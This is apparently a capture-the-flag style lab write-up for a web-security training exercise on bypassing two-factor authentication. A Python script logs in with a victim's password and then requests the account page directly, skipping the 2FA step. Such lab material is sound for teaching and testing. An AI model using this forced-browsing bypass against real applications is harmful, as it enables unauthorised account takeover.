# 2FA simple bypass

> This lab's two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, access Carlos's account page.
- Your credentials: `wiener:peter`
- Victim's credentials `carlos:montoya`

```python
import requests
from bs4 import BeautifulSoup

# Configuration
BASE_URL = "https://0a31002703b8a2f18094356e00010078.web-security-academy.net/"

def exploit_2fa_bypass(url):
    session = requests.Session()
    
    # 1. Primary Authentication Phase (Premature Session Issuance)
    login_endpoint = f"{url}login"
    
    login_credentials = {
        "username": "carlos",
        "password": "montoya"
    }
    
    # Submitting credentials. The server will redirect to /login2, but the session is already fully authenticated.
    session.post(login_endpoint, data=login_credentials)
    print("[+] PRIMARY CREDENTIALS SUBMITTED")
    
    # 2. Forced Browsing Phase (The Bypass)
    # Directly accessing the restricted endpoint, ignoring the 2FA prompt
    my_account_endpoint = f"{url}my-account"
    target_account = {"id": "carlos"}
    
    print("[*] Executing Forced Browsing to bypass 2FA...")
    response = session.get(my_account_endpoint, params=target_account)
    
    # 3. Verification Phase
    if "Log out" in response.text and "carlos" in response.text:
        print("[+] SUCCESS: 2FA BYPASSED. LOGGED IN AS CARLOS.")
        
        # Final lab check
        final_check = session.get(url)
        if "Congratulations" in final_check.text:
            print("[+] TARGET SECURED: Lab Solved.")
    else:
        print("[-] Bypass failed.")

if __name__ == "__main__":
    exploit_2fa_bypass(BASE_URL)
```